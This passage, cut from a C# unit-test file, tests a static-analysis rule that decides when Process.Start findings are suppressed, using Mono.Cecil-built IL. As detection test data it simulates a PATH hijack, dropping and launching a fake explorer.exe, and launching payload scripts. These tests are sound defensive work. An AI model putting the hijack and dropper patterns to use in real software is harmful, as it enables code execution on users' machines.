        processor.Emit(OpCodes.Ldloc, startInfoLocal);
        processor.Emit(OpCodes.Ldarg_0);
        processor.Emit(OpCodes.Callvirt, setFileName);
        processor.Emit(OpCodes.Ldloc, startInfoLocal);
        processor.Emit(OpCodes.Ldc_I4_1);
        processor.Emit(OpCodes.Callvirt, setUseShellExecute);
        processor.Emit(OpCodes.Ldloc, startInfoLocal);
        processor.Emit(OpCodes.Call, processStart);

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        var result = _rule.ShouldSuppressFinding(processStart, instructions, callIndex, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_UnrelatedDirectoryCheckBeforeShellExecutable_ReturnsFalse()
    {
        var scenario = BuildShellFolderLaunchScenario(@"C:\BenignFolder", "powershell.exe", useDirectoryExists: true);

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_DifferentDirectoryTargetBeforeShellLaunch_ReturnsFalse()
    {
        var scenario = BuildShellFolderLaunchScenario(@"C:\BenignFolder", "powershell.exe");

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ShellProtocolTarget_ReturnsFalse()
    {
        var scenario = BuildShellFolderLaunchScenario("shell:AppsFolder", "shell:AppsFolder");

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ComposedDynamicTarget_ReturnsFalse()
    {
        var scenario = BuildShellFolderLaunchScenario(
            @"C:\Base\<dynamic via Next>",
            @"C:\Base\<dynamic via Next>");

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ReassignedPathParameter_ReturnsFalse()
    {
        var scenario = BuildShellFolderLaunchScenario(
            @"C:\BenignFolder",
            "different.exe",
            useParameterTarget: true,
            reassignParameter: true);

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_EarlyReturnDirectoryExistsGuard_ReturnsTrue()
    {
        var scenario = BuildShellFolderLaunchScenario(
            @"C:\BenignFolder",
            @"C:\BenignFolder",
            useDirectoryExists: true,
            earlyReturnExists: true);

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ConditionalStartInfoAliasStore_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("", "Void", null, null));
        var processStartInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var alias = new VariableDefinition(processStartInfoType);
        var first = new VariableDefinition(processStartInfoType);
        var second = new VariableDefinition(processStartInfoType);
        method.Body.Variables.Add(alias);
        method.Body.Variables.Add(first);
        method.Body.Variables.Add(second);
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var constructor = new MethodReference(".ctor", method.ReturnType, processStartInfoType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, processStartInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(new TypeReference("System", "String", null, null)));
        var il = method.Body.GetILProcessor();

        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, first);
        il.Emit(OpCodes.Ldloc, first);
        il.Emit(OpCodes.Stloc, alias);
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, second);
        il.Emit(OpCodes.Ldarg_0);
        var useAlias = Instruction.Create(OpCodes.Nop);
        il.Emit(OpCodes.Brfalse, useAlias);
        il.Emit(OpCodes.Ldloc, second);
        il.Emit(OpCodes.Stloc, alias);
        il.Append(useAlias);
        il.Emit(OpCodes.Ldloc, alias);
        il.Emit(OpCodes.Ldstr, "folder");
        il.Emit(OpCodes.Callvirt, setFileName);

        var result = InstructionValueResolver.TryResolveCallReceiverIdentity(
            method.Body.Instructions, method.Body.Instructions.Count - 1, out _);

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_CreatedExtensionlessFolder_ReturnsTrue()
    {
        var scenario = BuildShellFolderLaunchScenario("powershell", "powershell");

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeTrue("successful directory creation proves this target is a folder, not an interpreter lookup");
    }

    [Fact]
    public void ShouldSuppressFinding_ArbitraryExecutable_ReturnsFalse()
    {
        // Arrange: Build IL for arbitrary executable
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "malware.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_CmdExe_ReturnsFalse()
    {
        // Arrange: Build IL for cmd.exe
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "cmd.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_RestartWithStringManipulation_ReturnsFalse()
    {
        // Arrange: Build IL with restart pattern but then string manipulation
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_MainModule", new TypeReference("", "ProcessModule", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_FileName", new TypeReference("", "String", null, null), new TypeReference("System.Diagnostics", "ProcessModule", null, null)));
        processor.Emit(OpCodes.Ldstr, " --arg");
        processor.Emit(OpCodes.Call, new MethodReference("Concat", new TypeReference("", "String", null, null), new TypeReference("System", "String", null, null)));
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerExeCaseInsensitive_ReturnsTrue()
    {
        // Arrange: Build IL with mixed case "Explorer.EXE"
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();
        var processStart = CreateProcessStart(new TypeReference("System", "String", null, null));

        processor.Emit(OpCodes.Ldstr, "Explorer.EXE");
        processor.Emit(OpCodes.Call, processStart);

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(processStart, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeTrue();
    }

    #endregion

    #region Security Tests - PATH Manipulation Attack

    /// <summary>
    /// SECURITY TEST: PATH manipulation attack vector
    /// If attacker modifies PATH to point to malicious explorer.exe, 
    /// Process.Start("explorer.exe") should NOT be suppressed.
    /// </summary>

    [Fact]
    public void ShouldSuppressFinding_WithEnvironmentVariableModification_ReturnsFalse()
    {
        // Arrange: Build IL that modifies PATH then calls explorer.exe
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        // Simulate: Environment.SetEnvironmentVariable("PATH", maliciousPath + ";" + currentPath)
        processor.Emit(OpCodes.Ldstr, "PATH");
        processor.Emit(OpCodes.Ldstr, "C:\\Malicious;C:\\Windows");
        processor.Emit(OpCodes.Call, new MethodReference("SetEnvironmentVariable", new TypeReference("", "Void", null, null), new TypeReference("System", "Environment", null, null)));

        // Now call explorer.exe (which would resolve to malicious version)
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Create MethodSignals with environment modification flag set
        var signals = new MethodSignals { HasEnvironmentVariableModification = true };

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, signals);

        // Assert - Should NOT suppress because PATH was manipulated
        result.Should().BeFalse("Process.Start should NOT be suppressed when environment variables were modified (PATH manipulation attack)");
    }

    [Fact]
    public void ShouldSuppressFinding_NoEnvironmentModification_ReturnsTrue()
    {
        // Arrange: Normal explorer.exe call without PATH manipulation
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();
        var processStart = CreateProcessStart(
            new TypeReference("System", "String", null, null),
            new TypeReference("System", "String", null, null));

        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Ldstr, "C:\\SomePath");
        processor.Emit(OpCodes.Call, processStart);

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // No environment modification
        var signals = new MethodSignals { HasEnvironmentVariableModification = false };

        // Act
        var result = _rule.ShouldSuppressFinding(processStart, instructions, callIndex, signals);

        // Assert - Should suppress because no PATH manipulation
        result.Should().BeTrue("Process.Start should be suppressed when no environment modification detected");
    }

    #endregion

    #region Security Tests - Embedded Resource Extraction Attack

    /// <summary>
    /// SECURITY TEST: Embedded resource extraction attack vector
    /// If attacker embeds malicious explorer.exe as resource, extracts it via File.WriteAllBytes,
    /// then calls Process.Start("explorer.exe"), we should NOT suppress.
    /// Windows resolves bare filenames from current directory before PATH.
    /// </summary>

    [Fact]
    public void ShouldSuppressFinding_WithFileWrite_ReturnsFalse()
    {
        // Arrange: File write (extracting embedded resource) then Process.Start
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        // Simulate: File.WriteAllBytes("explorer.exe", maliciousBytes)
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Ldloc_0); // byte array from embedded resource
        processor.Emit(OpCodes.Call, new MethodReference("WriteAllBytes", new TypeReference("", "Void", null, null), new TypeReference("System.IO", "File", null, null)));

        // Now call explorer.exe (which would be the just-dropped malicious version)
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Create MethodSignals with file write flag set
        var signals = new MethodSignals { HasFileWrite = true };

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, signals);

        // Assert - Should NOT suppress because file was written (could be embedded resource extraction)
        result.Should().BeFalse("Process.Start should NOT be suppressed when files were written (embedded resource attack)");
    }

    [Fact]
    public void ShouldSuppressFinding_NoFileWrite_ReturnsTrue()
    {
        // Arrange: Normal explorer.exe call without file writes
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();
        var processStart = CreateProcessStart(
            new TypeReference("System", "String", null, null),
            new TypeReference("System", "String", null, null));

        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Ldstr, "C:\\SomePath");
        processor.Emit(OpCodes.Call, processStart);

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // No file writes
        var signals = new MethodSignals { HasFileWrite = false };

        // Act
        var result = _rule.ShouldSuppressFinding(processStart, instructions, callIndex, signals);

        // Assert - Should suppress because no file writes detected
        result.Should().BeTrue("Process.Start should be suppressed when no file writes detected");
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerWithExecutableArgument_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processStart = CreateProcessStart(stringType, stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "explorer.exe");
        il.Emit(OpCodes.Ldstr, @"C:\temp\payload.exe");
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerWithShortcutArgument_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processStart = CreateProcessStart(stringType, stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "explorer.exe");
        il.Emit(OpCodes.Ldstr, @"C:\temp\folder.lnk");
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Theory]
    [InlineData(@"C:\temp\payload.wsf")]
    [InlineData(@"C:\temp\payload.jse")]
    [InlineData(@"C:\temp\payload.vbe")]
    public void ShouldSuppressFinding_ExplorerWithWindowsScriptArgument_ReturnsFalse(string argument)
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processStart = CreateProcessStart(stringType, stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "explorer.exe");
        il.Emit(OpCodes.Ldstr, argument);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_EquivalentExplorerLiteralsAcrossBranch_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var stringType = new TypeReference("System", "String", null, null);
        var target = new VariableDefinition(stringType);
        method.Body.Variables.Add(target);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        var falseBranch = Instruction.Create(OpCodes.Ldstr, "explorer.exe");
        var launchTarget = Instruction.Create(OpCodes.Ldloc, target);
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Brfalse, falseBranch);
        il.Emit(OpCodes.Ldstr, "explorer.exe");
        il.Emit(OpCodes.Stloc, target);
        il.Emit(OpCodes.Br, launchTarget);
        il.Append(falseBranch);
        il.Emit(OpCodes.Stloc, target);
        il.Append(launchTarget);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch), new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_RestartTargetOverwrittenInFinally_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var targetLocal = new VariableDefinition(stringType);
        method.Body.Variables.Add(targetLocal);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        var tryStart = Instruction.Create(OpCodes.Call,
            new MethodReference("GetCurrentProcess", processType, processType));
        il.Append(tryStart);
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, targetLocal);
        var launch = Instruction.Create(OpCodes.Ldloc, targetLocal);
        var handlerStart = Instruction.Create(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Leave, launch);
        il.Append(handlerStart);
        il.Emit(OpCodes.Stloc, targetLocal);
        il.Emit(OpCodes.Endfinally);
        il.Append(launch);
        il.Emit(OpCodes.Call, processStart);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Finally)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = launch
        });

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1,
            new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() });

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_RestartInsideUnrelatedFinallyProtectedRegion_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var targetLocal = new VariableDefinition(stringType);
        method.Body.Variables.Add(targetLocal);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        var tryStart = Instruction.Create(OpCodes.Call,
            new MethodReference("GetCurrentProcess", processType, processType));
        il.Append(tryStart);
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, targetLocal);
        il.Emit(OpCodes.Ldloc, targetLocal);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);
        var afterHandler = Instruction.Create(OpCodes.Ret);
        var handlerStart = Instruction.Create(OpCodes.Nop);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(handlerStart);
        il.Emit(OpCodes.Endfinally);
        il.Append(afterHandler);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Finally)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = afterHandler
        });

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch),
            new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() });

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_BareExplorerInsideCatch_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        var tryStart = Instruction.Create(OpCodes.Nop);
        var handlerStart = Instruction.Create(OpCodes.Pop);
        var afterHandler = Instruction.Create(OpCodes.Ret);
        il.Append(tryStart);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(handlerStart);
        il.Emit(OpCodes.Ldstr, "explorer.exe");
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(afterHandler);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Catch)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = afterHandler,
            CatchType = new TypeReference("System", "Exception", null, null)
        });

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch),
            new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() });

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_CurrentProcessRestartInsideCatch_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var restartPath = new VariableDefinition(stringType);
        method.Body.Variables.Add(restartPath);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        var tryStart = Instruction.Create(OpCodes.Nop);
        var handlerStart = Instruction.Create(OpCodes.Pop);
        var afterHandler = Instruction.Create(OpCodes.Ret);
        il.Append(tryStart);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(handlerStart);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, restartPath);
        il.Emit(OpCodes.Ldloc, restartPath);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(afterHandler);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Catch)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = afterHandler,
            CatchType = new TypeReference("System", "Exception", null, null)
        });

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch),
            new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() });

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_CurrentProcessRestartInsideFinally_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var restartPath = new VariableDefinition(stringType);
        method.Body.Variables.Add(restartPath);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        var tryStart = Instruction.Create(OpCodes.Nop);
        var handlerStart = Instruction.Create(OpCodes.Call,
            new MethodReference("GetCurrentProcess", processType, processType));
        var afterHandler = Instruction.Create(OpCodes.Ret);
        il.Append(tryStart);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(handlerStart);
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, restartPath);
        il.Emit(OpCodes.Ldloc, restartPath);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);
        il.Emit(OpCodes.Endfinally);
        il.Append(afterHandler);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Finally)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = afterHandler
        });

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch),
            new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() });

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ProcessStartInfoRestartInsideFinally_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var startInfo = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(startInfo);
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = CreateProcessStart(startInfoType);
        var il = method.Body.GetILProcessor();
        var tryStart = Instruction.Create(OpCodes.Nop);
        var handlerStart = Instruction.Create(OpCodes.Newobj, constructor);
        var afterHandler = Instruction.Create(OpCodes.Ret);
        il.Append(tryStart);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(handlerStart);
        il.Emit(OpCodes.Stloc, startInfo);
        il.Emit(OpCodes.Ldloc, startInfo);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldloc, startInfo);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);
        il.Emit(OpCodes.Endfinally);
        il.Append(afterHandler);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Finally)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = afterHandler
        });

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch),
            new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() });

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ArgumentReassignedOnLoopBackedge_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var restartInfo = new ParameterDefinition("restartInfo", ParameterAttributes.None, startInfoType);
        var replacementInfo = new ParameterDefinition("replacementInfo", ParameterAttributes.None, startInfoType);
        method.Parameters.Add(restartInfo);
        method.Parameters.Add(replacementInfo);
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = CreateProcessStart(startInfoType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldarg, restartInfo);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Callvirt, setFileName);
        var loopStart = Instruction.Create(OpCodes.Ldarg, restartInfo);
        il.Append(loopStart);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);
        il.Emit(OpCodes.Ldarg, replacementInfo);
        il.Emit(OpCodes.Starg, restartInfo);
        il.Emit(OpCodes.Br, loopStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch), new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_FileNameOverwrittenAfterLaunchOnLoopBackedge_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var startInfo = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(startInfo);
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = CreateProcessStart(startInfoType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, startInfo);
        il.Emit(OpCodes.Ldloc, startInfo);
